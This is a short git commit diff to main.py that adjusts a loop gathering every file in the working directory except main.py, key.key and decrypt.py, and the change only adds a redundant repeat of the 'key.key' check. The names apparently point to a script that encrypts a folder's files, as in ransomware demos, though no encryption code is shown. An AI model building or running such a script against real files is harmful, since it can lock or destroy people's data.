224e838e29b8ee1f8d1fccb6b791fdd8de3b70ae
Im-your-hari <51747755+Im-your-hari@users.noreply.github.com>
2023-09-21 01:07:11 +0530

    Update main.py

--- main.py
+++ main.py
@@ -3,7 +3,7 @@ import os
 files = []
 
 for file in os.listdir():
-  if file == 'main.py' or file == 'key.key' or file == 'decrypt.py':
+  if file == 'main.py' or file == 'key.key' or file == 'decrypt.py' or file == 'key.key':
     continue
   if os.path.isfile(file):
     files.append(file)
